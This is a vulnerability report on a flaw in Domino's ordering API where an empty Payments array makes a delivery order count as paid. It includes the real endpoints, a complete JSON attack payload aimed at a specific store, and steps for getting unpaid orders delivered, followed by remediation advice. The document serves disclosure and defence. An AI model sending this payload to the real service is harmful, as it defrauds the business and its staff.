# Security Vulnerability Report: Domino’s Payment Bypass

## Executive Summary

A critical business logic vulnerability has been identified in Domino’s Power API that allows attackers to place delivery orders without providing payment information. The vulnerability stems from improper validation of empty payment arrays, enabling orders to be processed as “paid” when no payment method is actually provided.

## Vulnerability Details

**Classification:**

- **Category:** Functional/Business Logic
- **Sub-Category:** Other
- **Severity:** Critical

## Affected Systems

**Vulnerable Endpoints:**

- `POST https://order.dominos.com/power/place-order`
- `POST https://order.dominos.com/power/price-order`

**Location:** Domino’s Power API, specifically within the Order.Payments JSON array handling logic

**Vulnerable Parameter:** `Order.Payments` - empty array handling in JSON requests

## Technical Description

The Domino’s online ordering API accepts orders with an empty `Payments: []` array and processes them as if they are fully paid, rather than rejecting them or treating them as Cash on Delivery (COD). In affected store configurations, this results in the order being marked as “paid” in the store’s POS system, even though no payment method was supplied.

When COD prompts are disabled in the store’s Pulse POS settings, delivery staff receive no “Amount Due” notification on manifests or driver slips. This allows orders to be fulfilled and delivered with no payment being collected, as both the backend and driver interface indicate the order has already been paid.

## Proof of Concept

### Attack Payload

```json
{
  "Order": {
    "StoreID": "7450",
    "OrderMethod": "WEB",
    "ServiceMethod": "Delivery",
    "Address": {
      "StreetNumber": "165",
      "StreetName": "E TROPICANA AVE",
      "City": "LAS VEGAS",
      "Region": "NV",
      "PostalCode": "89109"
    },
    "FirstName": "Test",
    "LastName": "Customer",
    "Email": "test@example.com",
    "Phone": "7020000000",
    "Products": [
      {
        "Code": "P12IPAZA",
        "Qty": 1,
        "Options": {
          "O": {
            "1/1": "1.0"
          }
        }
      }
    ],
    "Payments": []
  }
}
```

### Validation Steps

1. **Construct Order Payload:** Create a valid order JSON payload containing:
- Valid store ID
- Menu items
- Delivery address
- Customer details
1. **Set Empty Payments:** Set `"Payments": []` in the payload, omitting any payment information
1. **Submit Request:** Send the payload to `/price-order` → `/place-order`
1. **Observe Results:**
- API returns `Status: 1` (order accepted)
- `Amounts.Payment` equals the total order amount
- `AmountsBreakdown.Cash` shows 0
- Driver or store POS does not indicate payment is due (if COD prompts are disabled)
1. **Order Fulfillment:** The order is delivered without requiring payment

## Business Impact

**Direct Financial Loss:**

- Orders are fulfilled and delivered without payment collection
- Revenue loss equivalent to the value of unpaid orders

**Scalability Risk:**

- Exploitable at scale if attackers enumerate stores with COD enabled and no driver prompts
- Potential for automated attacks targeting multiple locations

**Operational Impact:**

- Driver confusion when systems show conflicting payment status
- Store management challenges in tracking unpaid orders
- Potential inventory losses

## Recommended Remediation

### Immediate Actions

1. **Implement Payment Validation:** Enforce strict validation to reject any order where `Payments` array is empty unless explicitly marked as COD
1. **COD Handling:** If COD is allowed:
- Automatically populate `AmountsBreakdown.Cash` with the order total
- Display “Amount Due” prompts to drivers
- Update POS systems to clearly indicate cash collection required
1. **Backend Validation:** Ensure the backend cannot process an order as fully paid without:
- A valid payment method, OR
- Explicit COD declaration with proper flagging

### Long-term Improvements

1. **Payment Method Validation:** Implement comprehensive validation for all payment types
1. **POS Integration:** Review and strengthen integration between ordering API and POS systems
1. **Driver Interface Updates:** Ensure delivery personnel always receive accurate payment status information
1. **Audit Trail:** Implement logging for all payment-related order processing

## Risk Assessment

**Likelihood:** High - Simple to exploit with basic API knowledge  
**Impact:** High - Direct financial loss and operational disruption  
**Overall Risk:** Critical

## Recommendations for Testing

Before implementing fixes, validate the remediation by:

1. Testing edge cases with various payment array configurations
1. Verifying COD orders are properly flagged throughout the system
1. Confirming driver interfaces display accurate payment information
1. Testing across different store configurations and POS settings

## Conclusion

This vulnerability represents a critical business logic flaw that directly impacts revenue. Immediate remediation is recommended to prevent financial losses and maintain operational integrity. The fix should focus on robust payment validation while ensuring legitimate COD orders continue to function properly.
